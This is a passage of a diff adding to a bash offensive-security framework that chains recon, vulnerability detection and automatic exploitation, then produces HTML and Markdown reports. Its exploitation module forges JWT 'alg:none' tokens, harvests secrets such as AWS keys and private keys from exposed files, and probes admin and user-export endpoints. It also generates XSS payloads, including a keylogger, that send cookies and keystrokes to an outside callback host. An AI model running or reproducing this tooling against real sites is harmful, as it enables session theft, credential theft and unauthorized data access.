+            local alg_none; alg_none=$(python3 "$HOME/tools/jwt_tool/jwt_tool.py" -X a "$token" 2>/dev/null \
+                | grep -oE "eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\." | head -1 || true)
+            [[ -n "$alg_none" ]] && {
+                uniq_add "$O/jwt_alg_none.txt" "JWT_ALG_NONE_FORGED: $alg_none (orig: ${token:0:60}...)"
+                log_hit "JWT alg:none forged token ready: ${alg_none:0:40}..."
+            }
+        done < "$JWT_FILE"
+    fi
+
+    # ── 9. Sensitive files → content triage ──
+    if [[ -s "$WORKSPACE/vulns/misconfig/sensitive_files.txt" ]]; then
+        log_hit "EXPLOIT[SENSITIVE]: triaging exposed files for secrets"
+        while IFS= read -r line; do
+            local target; target=$(echo "$line" | grep -oP 'https?://\S+$' | head -1)
+            [[ -z "$target" ]] && continue
+            local body; body=$(_curl --max-time 8 "$target" 2>/dev/null | head -c 4000 || true)
+            if echo "$body" | grep -qiE "(aws_access_key|secret_access|BEGIN (RSA|OPENSSH) PRIVATE|db_password|DB_PASSWORD|APP_KEY|client_secret|api_key|private_key|password *=|passwd *=|SLACK_|STRIPE_|GH_TOKEN|AKIA[0-9A-Z]{16})"; then
+                uniq_add "$O/sensitive_triaged.txt" "### $target"
+                echo "$body" | grep -iE "(aws_access|secret_access|BEGIN (RSA|OPENSSH) PRIVATE|db_password|DB_PASSWORD|APP_KEY|client_secret|api_key|private_key|password *=|SLACK_|STRIPE_|GH_TOKEN|AKIA[0-9A-Z]{16})" \
+                    | head -10 | while IFS= read -r l; do uniq_add "$O/sensitive_triaged.txt" "$l"; done
+                uniq_add "$O/chain_confirmed.txt" "SECRET_EXPOSED: $target"
+                log_hit "Secrets in exposed file: $target"
+            fi
+        done < "$WORKSPACE/vulns/misconfig/sensitive_files.txt"
+    fi
+
+    # ── 10. BAC verified → deeper admin probing ──
+    if [[ -s "$WORKSPACE/classified/bac/bac_confirmed.txt" ]]; then
+        log_hit "EXPLOIT[BAC]: probing deeper admin surface on confirmed hosts"
+        while IFS= read -r line; do
+            local target; target=$(echo "$line" | grep -oP 'https?://\S+$' | head -1)
+            [[ -z "$target" ]] && continue
+            local base; base=$(echo "$target" | grep -oP 'https?://[^/]+' || true)
+            local path; path=$(echo "$target" | grep -oP '(?<=://)[^/]+\K/.*' || true)
+            [[ -z "$base" || -z "$path" ]] && continue
+            for probe in \
+                "${path}users" "${path}users/list" "${path}users?limit=100" \
+                "${path}config" "${path}settings" "${path}logs" \
+                "${path}api/v1/users" "${path}api/users" \
+                "${path}export?format=csv" "${path}download?file=users.csv" \
+                "${path}../users" "${path}?debug=1"; do
+                local c body
+                c=$(_curl -o /dev/null -w "%{http_code}" --max-time 6 "$base$probe" 2>/dev/null || echo 000)
+                [[ "$c" =~ ^(200|201)$ ]] || continue
+                body=$(_curl --max-time 6 "$base$probe" 2>/dev/null | head -c 1500 || true)
+                echo "$body" | grep -qiE '"(users|email|username|id|role|is_admin|data|records|total)"' && {
+                    uniq_add "$O/bac_deep.txt" "BAC_DEEP [${c}]: $base$probe"
+                    uniq_add "$O/chain_confirmed.txt" "BAC_DATA_ACCESS: $base$probe"
+                    log_hit "BAC deep data access: $base$probe"
+                }
+            done
+        done < "$WORKSPACE/classified/bac/bac_confirmed.txt"
+    fi
+
+    # ── 11. XSS → proof-of-concept generator (self-contained) ──
+    if [[ -s "$WORKSPACE/vulns/xss/dalfox_results.txt" ]]; then
+        log_hit "EXPLOIT[XSS]: writing PoC + keylogger payload stubs"
+        local poc="$O/xss_pocs.txt"
+        : > "$poc"
+        while IFS= read -r line; do
+            local target; target=$(echo "$line" | grep -oP 'https?://[^ ]+' | head -1)
+            [[ -z "$target" ]] && continue
+            local base; base=$(echo "$target" | grep -oP 'https?://[^?]+' | head -1)
+            local params; params=$(echo "$target" | grep -oP '\?.*' | head -1 | tr '&' '\n' | sed 's/=.*/=/')
+            local vuln_params=""
+            while IFS= read -r p; do
+                [[ -n "$p" ]] && vuln_params="$vuln_params$p"
+            done <<< "$params"
+            uniq_add "$poc" "### PoC: $base${vuln_params}PAYLOAD"
+            uniq_add "$poc" "### <script>fetch('https://$INTERACTSH_DOMAIN/xss?c='+document.cookie)</script>"
+            uniq_add "$poc" "### keylogger: <script>document.onkeypress=e=>fetch('https://$INTERACTSH_DOMAIN/k?k='+e.key)</script>"
+        done < "$WORKSPACE/vulns/xss/dalfox_results.txt"
+        uniq_add "$O/chain_confirmed.txt" "XSS[POC-GENERATED]: $(cnt "$poc") lines"
+    fi
+
+    # ── 12. Final chain summary ──
+    sort -u -o "$O/chain_confirmed.txt" "$O/chain_confirmed.txt" 2>/dev/null || true
+    local chain_final; chain_final=$(cnt "$O/chain_confirmed.txt")
+    log_section "MODULE 21 — EXPLOITATION CHAIN SUMMARY"
+    if [[ "$chain_final" -eq 0 ]]; then
+        log_warn "No chain-confirmed exploits — findings remain at detection level"
+    else
+        log_hit "CHAIN CONFIRMED: $chain_final exploitable primitives"
+        echo ""
+        echo -e "  ${BOLD}${RED}⚡ EXPLOITATION CHAIN RESULTS ⚡${NC}"
+        grep -oE '^[A-Z_]+\[[A-Z_-]+\]' "$O/chain_confirmed.txt" 2>/dev/null \
+            | sort | uniq -c | sort -rn | while IFS= read -r l; do
+                echo -e "  ${SYM_BUG} ${BOLD}$l${NC}"
+            done
+        echo ""
+        log_ok "Full chain artifacts → $O/"
+    fi
+}
+
+# ══════════════════════════════════════════════════════
+# MODULE 22 — REPORT GENERATOR (HTML + Markdown)
+# ══════════════════════════════════════════════════════
+html_esc() { sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g' <<< "$1"; }
+
+mod_report() {
+    progress "MODULE 22 — Report Generation"
+    log_section "MODULE 22 — HTML + MARKDOWN REPORT"
+    local R="$WORKSPACE/reports"
+    mkdir -p "$R" 2>/dev/null || true
+    local ts; ts=$(date '+%Y-%m-%d %H:%M:%S')
+    local dur=$(( ($(date +%s) - START_TIME) / 60 ))
+
+    # ── Counters per finding class ──
+    local c_cmdi c_lfi_rce c_lfi c_ssrf c_sqli c_idor c_xss c_cors c_oauth c_takeover c_sens c_bac c_chain c_nuclei_hi
+    c_cmdi=$(cnt "$WORKSPACE/vulns/cmdi/cmdi_confirmed.txt")
+    c_lfi_rce=$(cnt "$WORKSPACE/vulns/lfi/lfi_rce.txt")
+    c_lfi=$(cnt "$WORKSPACE/vulns/lfi/lfi_confirmed.txt")
+    c_ssrf=$(cnt "$WORKSPACE/vulns/ssrf/ssrf_confirmed.txt")
+    c_sqli=$(cnt "$WORKSPACE/vulns/sqli/sqli_findings.txt")
+    c_idor=$(cnt "$WORKSPACE/vulns/idor/idor_seq_diff.txt")
+    c_xss=$(cnt "$WORKSPACE/vulns/xss/dalfox_results.txt")
+    c_cors=$(cnt "$WORKSPACE/vulns/cors/cors_confirmed.txt")
+    c_oauth=$(cnt "$WORKSPACE/vulns/oauth/oauth_redirect_uri.txt")
+    c_takeover=$(cnt "$WORKSPACE/vulns/exploit/takeover_verified.txt")
+    [[ "$c_takeover" -eq 0 ]] && c_takeover=$(cnt "$WORKSPACE/vulns/nuclei/nuclei_takeover.txt")
+    c_sens=$(cnt "$WORKSPACE/vulns/misconfig/sensitive_files.txt")
+    c_bac=$(cnt "$WORKSPACE/classified/bac/bac_confirmed.txt")
+    c_chain=$(cnt "$WORKSPACE/vulns/exploit/chain_confirmed.txt")
+    c_nuclei_hi=$(cnt "$WORKSPACE/vulns/nuclei/nuclei_critical_high.txt")
+
+    local crit=$(( c_cmdi + c_lfi_rce + c_ssrf + c_chain ))
+    local high=$(( c_idor + c_cors + c_xss + c_bac + c_takeover + c_nuclei_hi ))
+    local med=$(( c_lfi + c_oauth + c_sens ))
+    local info=$(( c_sqli ))
+
+    # ── Markdown ──
+    local MD="$R/report.md"
+    {
+        echo "# BUG FRAMEWORK v$VERSION — Security Assessment Report"
+        echo ""
+        echo "**Target:** \`$DOMAIN\`  "
+        echo "**Date:** $ts  "
+        echo "**Duration:** ${dur} min  "
+        echo "**Mode:** $(if [[ "$F_DEEP" == true ]]; then echo DEEP; elif [[ "$F_QUICK" == true ]]; then echo QUICK; else echo FULL; fi)  "
+        echo "**Auth:** $(if [[ -n "$SESSION_COOKIE" ]]; then echo Authenticated; else echo Unauthenticated; fi)"
+        echo ""
+        echo "## Summary"
+        echo ""
+        echo "| Severity | Count |"
+        echo "|----------|-------|"
+        echo "| 🔴 Critical | $crit |"
+        echo "| 🟠 High     | $high |"
+        echo "| 🟡 Medium   | $med |"
+        echo "| 🔵 Info     | $info |"
+        echo ""
+        echo "## Auto-Exploitation Chain"
+        echo ""
+        if [[ "$c_chain" -gt 0 ]]; then
+            echo "**⚠️  $c_chain exploitable primitives chain-confirmed**"
+            echo ""
+            echo '```'
+            cat "$WORKSPACE/vulns/exploit/chain_confirmed.txt" 2>/dev/null
+            echo '```'
+        else
+            echo "No chain-confirmed exploits. Findings below remain candidates requiring manual validation."
+        fi
+        echo ""
+        echo "## Findings Detail"
+        echo ""
+        _report_md_section "Command Injection (CMDi)"      "$WORKSPACE/vulns/cmdi/cmdi_confirmed.txt"          "$c_cmdi"    "Critical"
+        _report_md_section "LFI → RCE (log poison)"        "$WORKSPACE/vulns/lfi/lfi_rce.txt"                  "$c_lfi_rce" "Critical"
+        _report_md_section "SSRF (confirmed)"              "$WORKSPACE/vulns/ssrf/ssrf_confirmed.txt"          "$c_ssrf"    "Critical"
+        _report_md_section "SQL Injection (confirmed)"     "$WORKSPACE/vulns/sqli/sqli_findings.txt"           "$c_sqli"    "Critical"
+        _report_md_section "IDOR (sequential diff)"        "$WORKSPACE/vulns/idor/idor_seq_diff.txt"           "$c_idor"    "High"
+        _report_md_section "XSS (dalfox)"                  "$WORKSPACE/vulns/xss/dalfox_results.txt"           "$c_xss"     "High"
+        _report_md_section "CORS (credentialed)"           "$WORKSPACE/vulns/cors/cors_confirmed.txt"          "$c_cors"    "High"
+        _report_md_section "BAC (unauth admin access)"     "$WORKSPACE/classified/bac/bac_confirmed.txt"       "$c_bac"     "High"
+        _report_md_section "Subdomain Takeover"            "$WORKSPACE/vulns/exploit/takeover_verified.txt"    "$c_takeover" "High"
+        _report_md_section "Nuclei Critical/High"          "$WORKSPACE/vulns/nuclei/nuclei_critical_high.txt"  "$c_nuclei_hi" "High"
+        _report_md_section "LFI (confirmed reads)"         "$WORKSPACE/vulns/lfi/lfi_confirmed.txt"            "$c_lfi"     "Medium"
+        _report_md_section "OAuth redirect_uri open"       "$WORKSPACE/vulns/oauth/oauth_redirect_uri.txt"     "$c_oauth"   "Medium"
+        _report_md_section "Sensitive Files Exposed"       "$WORKSPACE/vulns/misconfig/sensitive_files.txt"    "$c_sens"    "Medium"
+        echo ""
+        echo "## Scope & Methodology"
+        echo ""
+        echo "- Subdomain enum: subfinder, crt.sh, assetfinder, urlscan, amass, alterx"
+        echo "- Probing: httpx (status/tech/CDN fingerprint)"
+        echo "- URL collection: waybackurls, gau, waymore, urlscan, katana, hakrawler"
+        echo "- JS analysis: endpoint mining, API routes, secret scanning"
+        echo "- Detection: nuclei, dalfox, sqlmap, custom SSRF/LFI/CMDi/CSRF/CORS/IDOR engines"
+        echo "- Auto-exploitation: Module 21 chain (verified primitives only)"
+        echo ""
+        echo "*Generated by BUG FRAMEWORK v$VERSION — authorized testing only*"
+    } > "$MD"
+    log_ok "Markdown report → $MD"
+
+    # ── HTML ──
+    local HTML="$R/report.html"
+    {
+        cat << 'HTMLEOF'
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BUG FRAMEWORK Security Report</title>
+<style>
+:root { --bg:#0d1117; --card:#161b22; --border:#30363d; --text:#c9d1d9; --crit:#f85149; --high:#d29922; --med:#58a6ff; --info:#3fb950; }
+* { margin:0; padding:0; box-sizing:border-box; }
+body { background:var(--bg); color:var(--text); font-family:'Segoe UI',system-ui,sans-serif; padding:2rem; }
+.wrap { max-width:1100px; margin:0 auto; }
+h1 { color:#fff; font-size:1.8rem; margin-bottom:.2rem; }
+h2 { color:#fff; margin:2rem 0 1rem; border-bottom:1px solid var(--border); padding-bottom:.5rem; }
+.meta { color:#8b949e; font-size:.9rem; margin-bottom:2rem; }
+.cards { display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr)); gap:1rem; margin:1.5rem 0; }
+.card { background:var(--card); border:1px solid var(--border); border-radius:8px; padding:1rem; }
+.card .num { font-size:2rem; font-weight:700; }
+.card .lbl { font-size:.8rem; color:#8b949e; text-transform:uppercase; letter-spacing:.05em; }
+.crit .num { color:var(--crit); } .high .num { color:var(--high); } .med .num { color:var(--med); } .info .num { color:var(--info); }
+table { width:100%; border-collapse:collapse; margin:1rem 0; background:var(--card); border-radius:8px; overflow:hidden; }
+th { background:#21262d; text-align:left; padding:.6rem .8rem; font-size:.8rem; text-transform:uppercase; letter-spacing:.05em; color:#8b949e; }
+td { padding:.6rem .8rem; border-top:1px solid var(--border); font-size:.85rem; word-break:break-all; font-family:ui-monospace,monospace; }
+tr:hover td { background:#1c2128; }
+.badge { display:inline-block; padding:.15rem .5rem; border-radius:4px; font-size:.7rem; font-weight:700; text-transform:uppercase; }
+.b-crit { background:#3d1214; color:var(--crit); } .b-high { background:#3d2a0e; color:var(--high); }
+.b-med { background:#0e243d; color:var(--med); } .b-info { background:#0f2e18; color:var(--info); }
+pre { background:#0a0d12; border:1px solid var(--border); border-radius:8px; padding:1rem; overflow-x:auto; font-size:.8rem; max-height:400px; }
+.muted { color:#8b949e; }
+a { color:var(--med); }
+</style>
+</head>
+<body>
+<div class="wrap">
+HTMLEOF
+        echo "<h1>🐛 BUG FRAMEWORK v$VERSION — Security Assessment Report</h1>"
+        echo "<div class='meta'><b>Target:</b> $DOMAIN &nbsp;|&nbsp; <b>Date:</b> $ts &nbsp;|&nbsp; <b>Duration:</b> ${dur} min &nbsp;|&nbsp; <b>Mode:</b> $(if [[ "$F_DEEP" == true ]]; then echo DEEP; elif [[ "$F_QUICK" == true ]]; then echo QUICK; else echo FULL; fi) &nbsp;|&nbsp; <b>Auth:</b> $(if [[ -n "$SESSION_COOKIE" ]]; then echo Authenticated; else echo Unauthenticated; fi)</div>"
+        echo "<h2>Summary</h2>"
+        echo "<div class='cards'>"
+        echo "<div class='card crit'><div class='num'>$crit</div><div class='lbl'>Critical</div></div>"
+        echo "<div class='card high'><div class='num'>$high</div><div class='lbl'>High</div></div>"
+        echo "<div class='card med'><div class='num'>$med</div><div class='lbl'>Medium</div></div>"
+        echo "<div class='card info'><div class='num'>$info</div><div class='lbl'>Info</div></div>"
+        echo "</div>"
+        echo "<h2>⚡ Auto-Exploitation Chain</h2>"
+        if [[ "$c_chain" -gt 0 ]]; then
+            echo "<p class='muted'>$c_chain exploitable primitives chain-confirmed. Artifacts: <code>$WORKSPACE/vulns/exploit/</code></p>"
+            echo "<pre>$(cat "$WORKSPACE/vulns/exploit/chain_confirmed.txt" 2>/dev/null | html_esc)</pre>"
+        else
+            echo "<p class='muted'>No chain-confirmed exploits — findings require manual validation.</p>"
+        fi
+        echo "<h2>Findings Detail</h2>"
+        _report_html_section "Command Injection (CMDi)"    "$WORKSPACE/vulns/cmdi/cmdi_confirmed.txt"        "$c_cmdi"    "crit"
+        _report_html_section "LFI → RCE (log poison)"      "$WORKSPACE/vulns/lfi/lfi_rce.txt"                "$c_lfi_rce" "crit"
+        _report_html_section "SSRF (confirmed)"            "$WORKSPACE/vulns/ssrf/ssrf_confirmed.txt"        "$c_ssrf"    "crit"
+        _report_html_section "SQL Injection (confirmed)"   "$WORKSPACE/vulns/sqli/sqli_findings.txt"         "$c_sqli"    "crit"
+        _report_html_section "IDOR (sequential diff)"      "$WORKSPACE/vulns/idor/idor_seq_diff.txt"         "$c_idor"    "high"
+        _report_html_section "XSS (dalfox)"                "$WORKSPACE/vulns/xss/dalfox_results.txt"         "$c_xss"     "high"
+        _report_html_section "CORS (credentialed)"         "$WORKSPACE/vulns/cors/cors_confirmed.txt"        "$c_cors"    "high"
+        _report_html_section "BAC (unauth admin access)"   "$WORKSPACE/classified/bac/bac_confirmed.txt"     "$c_bac"     "high"
+        _report_html_section "Subdomain Takeover"          "$WORKSPACE/vulns/exploit/takeover_verified.txt"  "$c_takeover" "high"
+        _report_html_section "Nuclei Critical/High"        "$WORKSPACE/vulns/nuclei/nuclei_critical_high.txt" "$c_nuclei_hi" "high"
+        _report_html_section "LFI (confirmed reads)"       "$WORKSPACE/vulns/lfi/lfi_confirmed.txt"          "$c_lfi"     "med"
+        _report_html_section "OAuth redirect_uri open"     "$WORKSPACE/vulns/oauth/oauth_redirect_uri.txt"   "$c_oauth"   "med"
+        _report_html_section "Sensitive Files Exposed"     "$WORKSPACE/vulns/misconfig/sensitive_files.txt"  "$c_sens"    "med"
+        echo "<p class='muted' style='margin-top:3rem'>Generated by BUG FRAMEWORK v$VERSION — authorized testing only</p>"
+        echo "</div></body></html>"
+    } > "$HTML"
+    log_ok "HTML report → $HTML"
+}
+
+_report_md_section() {
+    local title="$1" file="$2" count="$3" sev="$4"
+    echo "### $title — [$count] ($sev)"
+    echo ""
+    if [[ "$count" -gt 0 ]]; then
+        echo '```'
+        head -50 "$file" 2>/dev/null
+        [[ "$count" -gt 50 ]] && echo "... ($(( count - 50 )) more)"
+        echo '```'
+    else
+        echo "_None found._"
+    fi
+    echo ""
+}
+
+_report_html_section() {
+    local title="$1" file="$2" count="$3" sev="$4"
+    echo "<h3>${title} <span class='badge b-${sev}'>${count}</span></h3>"
+    if [[ "$count" -gt 0 ]]; then
+        echo "<table><thead><tr><th>Finding</th></tr></thead><tbody>"
+        head -100 "$file" 2>/dev/null | while IFS= read -r l; do
+            echo "<tr><td>$(html_esc "$l")</td></tr>"
+        done
+        echo "</tbody></table>"
+        [[ "$count" -gt 100 ]] && echo "<p class='muted'>+ $(( count - 100 )) more in $file</p>"
+    else
+        echo "<p class='muted'>None found.</p>"
+    fi
+}
+
+# ══════════════════════════════════════════════════════
+# FULL SCAN ORCHESTRATOR
+# ══════════════════════════════════════════════════════
+run_full_scan() {
+    setup_workspace
+
+    if [[ "$M_EXPLOIT" == true ]]; then
+        # -exploit alone: ensure minimal data, run chain only
+        ensure_live; ensure_urls
+        mod_exploit_chain
+        mod_report
+        return
+    fi
+
+    if [[ "$M_VULN" == true ]]; then
+        # -vuln alone: detection only from existing recon
+        ensure_live; ensure_urls
+        run_mod "nuclei"   mod_nuclei
+        run_mod "xss"      mod_xss
+        run_mod "sqli"     mod_sqli
+        run_mod "ssrf"     mod_ssrf
+        run_mod "lfi"      mod_lfi
+        run_mod "cmdi"     mod_cmdi
+        run_mod "csrf"     mod_csrf
+        run_mod "cors"     mod_cors
+        run_mod "idor"     mod_idor
+        run_mod "oauth"    mod_oauth
+        run_mod "classify" mod_classify
+        [[ "$F_NO_EXPLOIT" == false ]] && run_mod "exploit" mod_exploit_chain
+        run_mod "report"   mod_report
+        return
+    fi
+
+    # ── FULL SCAN ──
+    log_step "STARTING FULL SCAN — $DOMAIN (v$VERSION)"
+    local SCAN_TOTAL=24
+
+    run_mod "subdomains" mod_subdomains
+    run_mod "httpx"      mod_httpx
+    run_mod "urls"       mod_urls
+    run_mod "js"         mod_js
+    run_mod "waf"        mod_waf
+    run_mod "api"        mod_api_schema
+    run_mod "pmf"        mod_param_fuzz
+    run_mod "paths"      mod_paths
+    run_mod "ports"      mod_ports
+    run_mod "exposure"   mod_exposure
+    run_mod "nuclei"     mod_nuclei
+    run_mod "xss"        mod_xss
+    run_mod "sqli"       mod_sqli
+    run_mod "ssrf"       mod_ssrf
+    run_mod "lfi"        mod_lfi
+    run_mod "cmdi"       mod_cmdi
+    run_mod "csrf"       mod_csrf
+    run_mod "cors"       mod_cors
+    run_mod "idor"       mod_idor
+    run_mod "oauth"      mod_oauth
+    run_mod "tech"       mod_tech
+    run_mod "screens"    mod_screenshots
+    run_mod "classify"   mod_classify
+    [[ "$F_NO_EXPLOIT" == false ]] && run_mod "exploit" mod_exploit_chain
+    run_mod "dedupe"     dedupe_workspace
+    run_mod "report"     mod_report
+
+    final_summary
+}
+
+# ── Single-mode dispatch ──
+run_single_mode() {
+    local m="$1"
+    case "$m" in
+        sub)   ensure_live; run_mod "subdomains" mod_subdomains; run_mod "httpx" mod_httpx ;;
+        one)   setup_workspace; mod_httpx; mod_urls; mod_js ;;
+        url)   ensure_live; run_mod "urls" mod_urls; run_mod "js" mod_js ;;
+        we)    ensure_live; run_mod "urls" mod_urls; run_mod "js" mod_js; run_mod "paths" mod_paths ;;
+        js)    ensure_live; ensure_urls; run_mod "js" mod_js ;;
+        fuzz)  ensure_live; run_mod "paths" mod_paths ;;
+        ports) ensure_live; run_mod "ports" mod_ports ;;
+        vuln)  ensure_live; ensure_urls; run_mod "nuclei" mod_nuclei; run_mod "xss" mod_xss; run_mod "sqli" mod_sqli; run_mod "ssrf" mod_ssrf; run_mod "lfi" mod_lfi; run_mod "cmdi" mod_cmdi; run_mod "csrf" mod_csrf; run_mod "cors" mod_cors; run_mod "idor" mod_idor; run_mod "oauth" mod_oauth; run_mod "classify" mod_classify; [[ "$F_NO_EXPLOIT" == false ]] && run_mod "exploit" mod_exploit_chain; run_mod "report" mod_report ;;
+        exploit) ensure_live; ensure_urls; run_mod "exploit" mod_exploit_chain; run_mod "report" mod_report ;;
+        nuclei) ensure_live; run_mod "nuclei" mod_nuclei; run_mod "report" mod_report ;;
+        xss)   ensure_live; ensure_urls; run_mod "xss" mod_xss ;;
+        sqli)  ensure_live; ensure_urls; run_mod "sqli" mod_sqli ;;
+        ssrf)  ensure_live; ensure_urls; run_mod "ssrf" mod_ssrf ;;
+        lfi)   ensure_live; ensure_urls; run_mod "lfi" mod_lfi ;;
+        csrf)  ensure_live; ensure_urls; run_mod "csrf" mod_csrf; run_mod "cors" mod_cors ;;
+        cors)  ensure_live; ensure_urls; run_mod "cors" mod_cors ;;
+        idor)  ensure_live; ensure_urls; run_mod "classify" mod_classify; run_mod "idor" mod_idor ;;
+        oauth) ensure_live; ensure_urls; run_mod "oauth" mod_oauth ;;
+        tech)  ensure_live; run_mod "tech" mod_tech ;;
+        waf)   ensure_live; run_mod "waf" mod_waf ;;
+        api)   ensure_live; run_mod "api" mod_api_schema ;;
+        pmf)   ensure_live; ensure_urls; run_mod "pmf" mod_param_fuzz ;;
+        report) setup_workspace; run_mod "report" mod_report ;;
+        *)     show_help ;;
     esac
-    [[ "$svc" == "other" ]] && continue
-    probe "http://$sub"
-    case "$svc" in
-      github)   echo "$RB" | grep -qi "There isn't a GitHub Pages site here" && seen="$sub" ;;
-      heroku)   echo "$RB" | grep -qi "No such app" && seen="$sub" ;;
-      azure)    echo "$RB" | grep -qiE "404 Web Site not found|NoSuchWebsite" && seen="$sub" ;;
-      s3)       echo "$RB" | grep -qi "NoSuchBucket" && seen="$sub" ;;
-      vercel)   echo "$RB" | grep -qi "NOT_FOUND" && seen="$sub" ;;
-      netlify)  echo "$RB" | grep -qi "Not Found" && seen="$sub" ;;
-      fastly)   echo "$RB" | grep -qi "Fastly error" && seen="$sub" ;;
-      shopify)  echo "$RB" | grep -qi "Only one step left" && seen="$sub" ;;
-    esac
-    if [[ -n "$seen" ]]; then
-      echo "HIGH|TAKEOVER-${svc^^}|$sub (CNAME $cname)" >> "$O/takeover.txt"
-      qadd high takeover "$sub"
-      log H "SUBDOMAIN TAKEOVER (${svc}): $sub"
-      seen=""
+}
+
+# ── Scope file mode ──
+run_scope_scan() {
+    [[ -f "$SCOPE_FILE" ]] || { log_err "Scope file not found: $SCOPE_FILE"; exit 1; }
+    log_step "SCOPE SCAN — $(cnt "$SCOPE_FILE") targets from $SCOPE_FILE"
+    while IFS= read -r line; do
+        [[ -z "$line" || "$line" == \#* ]] && continue
+        DOMAIN=$(echo "$line" | sed 's|https\?://||g' | sed 's|/$||g' | awk '{print $1}')
+        [[ -z "$DOMAIN" ]] && continue
+        log_hit "=== SCOPED TARGET: $DOMAIN ==="
+        run_full_scan
+    done < "$SCOPE_FILE"
+}
+
+# ══════════════════════════════════════════════════════
+# FINAL SUMMARY
+# ══════════════════════════════════════════════════════
+final_summary() {
+    local elapsed=$(( ($(date +%s) - START_TIME) / 60 ))
+    local V="$WORKSPACE/vulns"
+    local tot
+    tot=$(cat \
+        "$V/cmdi/cmdi_confirmed.txt" \
+        "$V/lfi/lfi_confirmed.txt" \
+        "$V/lfi/lfi_rce.txt" \
+        "$V/ssrf/ssrf_confirmed.txt" \
+        "$V/sqli/sqli_findings.txt" \
+        "$V/idor/idor_seq_diff.txt" \
+        "$V/xss/dalfox_results.txt" \
+        "$V/cors/cors_confirmed.txt" \
+        "$V/exploit/chain_confirmed.txt" \
+        "$WORKSPACE/classified/bac/bac_confirmed.txt" \
+        "$WORKSPACE/vulns/misconfig/sensitive_files.txt" \
+        2>/dev/null | wc -l)
+
+    echo ""
+    echo -e "  ${BOLD}${WHITE}╔══════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "  ${BOLD}${WHITE}║  ${MAGENTA}FINAL SUMMARY${NC}${BOLD}${WHITE}                                      ║${NC}"
+    echo -e "  ${BOLD}${WHITE}╠══════════════════════════════════════════════════════════════╣${NC}"
+    echo -e "  ${BOLD}${WHITE}║${NC}  Target        : ${CYAN}${DOMAIN}${NC}"
+    echo -e "  ${BOLD}${WHITE}║${NC}  Duration      : ${YELLOW}${elapsed} min${NC}"
+    echo -e "  ${BOLD}${WHITE}║${NC}  Workspace     : ${DIM}${WORKSPACE}${NC}"
+    echo -e "  ${BOLD}${WHITE}║${NC}  Total findings: ${RED}${tot}${NC}"
+    echo -e "  ${BOLD}${WHITE}║${NC}  Reports       : ${GREEN}${WORKSPACE}/reports/report.html${NC}"
+    echo -e "  ${BOLD}${WHITE}╚══════════════════════════════════════════════════════════════╝${NC}"
+
+    echo ""
+    echo -e "  ${BOLD}${YELLOW}┌─ FINDING BREAKDOWN ──────────────────────────────────────────────┐${NC}"
+    [[ -s "$V/exploit/chain_confirmed.txt" ]] && echo -e "  ${SYM_BUG} ${BOLD}${RED}Exploited/Chain-confirmed : $(cnt "$V/exploit/chain_confirmed.txt")${NC}"
+    [[ -s "$V/cmdi/cmdi_confirmed.txt" ]]  && echo -e "  ${SYM_BUG} CMDi confirmed            : $(cnt "$V/cmdi/cmdi_confirmed.txt")"
+    [[ -s "$V/lfi/lfi_rce.txt" ]]          && echo -e "  ${SYM_BUG} LFI→RCE                   : $(cnt "$V/lfi/lfi_rce.txt")"
+    [[ -s "$V/lfi/lfi_confirmed.txt" ]]    && echo -e "  ${SYM_BUG} LFI confirmed             : $(cnt "$V/lfi/lfi_confirmed.txt")"
+    [[ -s "$V/ssrf/ssrf_confirmed.txt" ]]  && echo -e "  ${SYM_BUG} SSRF confirmed            : $(cnt "$V/ssrf/ssrf_confirmed.txt")"
+    [[ -s "$V/sqli/sqli_findings.txt" ]]   && echo -e "  ${SYM_BUG} SQLi confirmed            : $(cnt "$V/sqli/sqli_findings.txt")"
+    [[ -s "$V/idor/idor_seq_diff.txt" ]]   && echo -e "  ${SYM_BUG} IDOR candidates           : $(cnt "$V/idor/idor_seq_diff.txt")"
+    [[ -s "$V/xss/dalfox_results.txt" ]]   && echo -e "  ${SYM_BUG} XSS hits                  : $(cnt "$V/xss/dalfox_results.txt")"
+    [[ -s "$V/cors/cors_confirmed.txt" ]]  && echo -e "  ${SYM_BUG} CORS credentialed          : $(cnt "$V/cors/cors_confirmed.txt")"
+    [[ -s "$WORKSPACE/classified/bac/bac_confirmed.txt" ]] && echo -e "  ${SYM_BUG} BAC unauth access         : $(cnt "$WORKSPACE/classified/bac/bac_confirmed.txt")"
+    [[ -s "$V/misconfig/sensitive_files.txt" ]] && echo -e "  ${SYM_BUG} Sensitive files exposed    : $(cnt "$V/misconfig/sensitive_files.txt")"
+    [[ -s "$V/nuclei/nuclei_critical_high.txt" ]] && echo -e "  ${SYM_BUG} Nuclei critical/high       : $(cnt "$V/nuclei/nuclei_critical_high.txt")"
+    echo -e "  ${BOLD}${YELLOW}└──────────────────────────────────────────────────────────────────┘${NC}"
+    echo ""
+    echo -e "  ${GREEN}Scan complete. Open the report:${NC} ${BOLD}${WORKSPACE}/reports/report.html${NC}"
+    echo ""
+}
+
+# ══════════════════════════════════════════════════════
+# MAIN
+# ══════════════════════════════════════════════════════
+main() {
+    parse_args "$@"
+
+    if [[ "$F_INSTALL" == true ]]; then
+        install_tools
+        exit 0
     fi
-  done < "$W/subs/all.txt"
-  u "$O/takeover.txt"
-  log OK "takeover verified: $(cnt "$O/takeover.txt")"
-}
-NEMESIS_EOF
-echo "PART 5 of 6 appended — $(wc -l < /usr/local/bin/bug) lines so far"
-cat >> /usr/local/bin/bug <<'NEMESIS_EOF'
+    if [[ "$F_UPDATE_NUCLEI" == true ]]; then
+        nuclei -update-templates -silent && log_ok "Nuclei templates updated"
+        exit 0
+    fi
+    if [[ -z "$DOMAIN" && -z "$SCOPE_FILE" ]]; then
+        log_err "No target specified. Use -d <domain> or -scope <file>"
+        show_help
+    fi
 
-# ─────────────────────────── MAIN PIPELINE ───────────────────────────
-run_pipeline() {
-  mkdir -p "$W"/{subs,urls,js,js/paths,js/raw,vulns,vulns/web,vulns/authz,vulns/cloud,vulns/fuzz,vulns/nuclei,vulns/param_fuzz,api,exploits,reports,screenshots}
-  echo "NEMESIS v$VERSION — $DOMAIN — $(date)" > "$LOG"
-  step "01 RECON — subdomain enumeration"
-  : > "$W/subs/all.txt"
